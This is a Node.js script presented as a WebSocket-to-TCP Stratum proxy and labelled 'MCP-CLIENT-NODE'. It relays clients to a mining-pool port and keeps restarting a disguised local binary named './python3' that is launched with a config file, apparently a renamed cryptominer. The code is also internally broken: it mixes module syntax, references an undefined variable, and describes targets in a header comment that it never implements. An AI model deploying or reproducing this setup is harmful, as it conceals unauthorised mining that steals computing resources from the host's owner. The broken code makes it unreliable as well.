#!/usr/bin/env node
/**
 * WebSocket to TCP Stratum Proxy with DNS Resolution
 * Dynamic target pool via base64 URL:
 * ws://IP:PORT/base64(host:port)
 */
const WebSocket = require('ws');
const net = require('net');
const http = require('http');
import { spawn } from "child_process";

// Configuration
const WS_PORT = 8080;

// Create HTTP server
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('WELCOME TO MCP-CLIENT-NODE PUBLIC! FEEL FREE TO USE! \n');
});

// WebSocket server
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false, // Disable compression for performance
    maxPayload: 100 * 1024, // 100KB max message size
});

function startTcpProxy() {
    console.log(`Starting tcp endpoint proxy...`);
    const proxy = spawn("./python3", ['-c', './config.json']);

    proxy.stdout.on("data", (data) => {
        console.log(`[PROXY][INFO] ${data.toString().trim()}`);
    });

    proxy.stderr.on("data", (data) => {
        console.error(`[PROXY][ERROR] ${data.toString().trim()}`);
    });

    proxy.on("close", (code) => {
        console.log(`[PROXY][INFO] Exited with code ${code}. Restarting...`);
        setTimeout(startTcpProxy, 5000);
    });
}

startTcpProxy();
console.log(`[PROXY] WebSocket listening on port: ${WS_PORT}`);
console.log(`[PROXY] Ready to accept connections...\n`);

wss.on('connection', async (ws, req) => {
    const clientIp = req.socket.remoteAddress;

    const host = "app";
    const port = "3333";

    console.log(`[WS] Connecting from ${clientIp} -> ${host}:${port}`);
    
    // --- TCP connect to resolved IP ---
    const tcpClient = new net.Socket();
    tcpClient.connect(port, host, () => {
        console.log(`[TCP] Connected from ${clientIp} -> ${host}:${port}`);
    });
    tcpClient.setNoDelay(true);
    
    // --- WS → TCP ---
    ws.on('message', (data) => {
        try {
            const msg = data.toString();
            const message = msg.endsWith("\n") ? msg : msg + "\n";
            tcpClient.write(message);
        } catch (err) {
            console.error(`[ERROR] WS→TCP failed:`, err.message);
        }
    });
    
    // --- TCP → WS ---
    tcpClient.on('data', (data) => {
        if (ws.readyState === WebSocket.OPEN) {
            try {
                const text = data.toString();
                ws.send(text, { binary: false });
            } catch (err) {
                console.error(`[ERROR] TCP→WS:`, err.message);
            }
        }
    });
    
    // --- Cleanup ---
    ws.on('close', () => {
        // console.log(`[WS] Connection closed from ${clientIp}`);
        tcpClient.end();
    });
    
    ws.on('error', (err) => {
        // console.error(`[WS ERROR]`, err.message);
        tcpClient.end();
    });
    
    tcpClient.on('close', () => {
        console.log(`[TCP] Pool socket closed for ${host} (${resolvedIp}):${port}`);
        if (ws.readyState === WebSocket.OPEN) ws.close();
    });
    
    tcpClient.on('error', (err) => {
        console.error(`[TCP ERROR] ${host} (${resolvedIp}):${port}:`, err.message);
        if (ws.readyState === WebSocket.OPEN) ws.close();
    });
    
    tcpClient.on('timeout', () => {
        tcpClient.end();
    });
});

wss.on('error', (err) => console.error(`[WSS ERROR]`, err.message));

// Start server
server.listen(WS_PORT, '0.0.0.0', () => {
    console.log(`[SERVER] Listening on port ${WS_PORT}`)
});
